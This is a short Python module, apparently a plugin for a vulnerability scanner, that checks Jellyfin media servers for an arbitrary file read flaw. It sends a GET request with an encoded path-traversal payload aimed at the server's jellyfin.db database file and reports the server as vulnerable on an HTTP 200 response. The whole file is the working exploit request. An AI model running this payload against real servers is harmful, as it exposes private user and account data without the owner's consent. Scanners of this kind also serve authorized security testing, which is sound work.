import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def JellyfinAny(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vulpath = "Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/"
    target = urldata +  vulpath
    # print("正在请求：".format(target))
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "accept": "application/json",
        "Accept-Encoding":"gzip, deflate",

    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(target,headers=headers)
        if response.status_code == 200:
            print(Vcolors.RED + "[!] 存在Jellyfin任意文件读取漏洞\r" + Vcolors.ENDC)
            
        else:pass
    except:
        logging.error("jellyfinAny脚本出现异常")


